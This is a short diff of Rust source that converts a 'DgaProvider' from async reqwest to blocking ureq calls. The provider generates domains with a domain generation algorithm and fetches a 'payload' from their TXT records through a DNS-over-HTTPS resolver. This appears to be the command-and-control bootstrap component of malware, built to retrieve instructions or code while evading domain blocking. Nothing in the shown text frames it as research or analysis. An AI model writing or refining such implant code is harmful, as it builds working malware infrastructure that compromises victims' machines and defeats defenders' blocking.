@@ -1,5 +1,3 @@
-use async_trait::async_trait;
-use reqwest::Client;
 use std::error::Error;
 use std::time::{SystemTime, UNIX_EPOCH};
 use log::debug;
@@ -40,14 +38,16 @@ impl DgaProvider {
     }
 }
 
-#[async_trait]
 impl BootstrapProvider for DgaProvider {
-    async fn fetch_payload(&self, client: &Client) -> Result<String, Box<dyn Error + Send + Sync>> {
+    fn fetch_payload(&self) -> Result<String, Box<dyn Error + Send + Sync>> {
         let domain = self.generate_domain();
         debug!("[Bootstrap] DGA Generated: {}", domain);
         
         let url = format!("{}?name={}&type=TXT", self.resolver_url, domain);
-        let resp = client.get(&url).send().await?.json::<DohResponse>().await?;
+        let resp: DohResponse = ureq::get(&url)
+            .timeout(std::time::Duration::from_secs(15))
+            .call()?
+            .into_json()?;
 
         if let Some(answers) = resp.answer {
             for answer in answers {
